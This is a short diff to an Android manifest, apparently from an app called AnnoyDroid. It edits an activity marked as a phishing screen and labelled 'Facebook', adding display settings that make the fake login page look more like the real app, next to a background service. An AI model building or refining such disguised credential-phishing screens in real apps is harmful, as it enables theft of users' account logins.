@@ -20,7 +20,7 @@
         </activity>
         
         <!-- Phishing screens -->
-		<activity android:label="Facebook" android:name=".phish.PhacebookActivity"></activity>
+		<activity android:label="Facebook" android:name=".phish.PhacebookActivity" android:theme="@android:style/Theme.NoTitleBar" android:screenOrientation="portrait" android:launchMode="singleTop"></activity>
         
 		    <!--  The background service -->
         <service android:enabled="true" android:name="nima.nikzad.annoydroid.AnnoyDroidService" />
